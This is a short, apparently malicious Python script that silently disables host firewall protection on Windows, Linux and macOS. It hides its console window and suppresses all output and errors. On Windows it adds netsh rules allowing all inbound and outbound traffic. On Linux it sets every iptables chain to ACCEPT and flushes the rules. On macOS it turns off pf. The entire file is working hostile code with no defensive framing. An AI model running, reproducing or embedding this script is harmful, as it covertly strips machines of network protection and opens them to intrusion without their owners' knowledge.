import subprocess
import sys
import os
import platform

def run_stealthily():
    system = platform.system()
    
    if system == "Windows":
        try:
            subprocess.run(
                'netsh advfirewall firewall add rule name="Open_All_Ports" dir=in action=allow protocol=any localport=any',
                shell=True,
                check=False,
                creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            subprocess.run(
                'netsh advfirewall firewall add rule name="Open_All_Ports_Out" dir=out action=allow protocol=any localport=any',
                shell=True,
                check=False,
                creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        except Exception:
            pass
    
    elif system == "Linux":
        try:
            subprocess.run(
                "sudo iptables -P INPUT ACCEPT && sudo iptables -P OUTPUT ACCEPT && sudo iptables -P FORWARD ACCEPT && sudo iptables -F",
                shell=True,
                check=False,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        except Exception:
            pass
    
    elif system == "Darwin":
        try:
            subprocess.run(
                'sudo pfctl -d',
                shell=True,
                check=False,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        except Exception:
            pass

def main():
    if platform.system() == "Windows":
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    
    run_stealthily()

if __name__ == "__main__":
    main()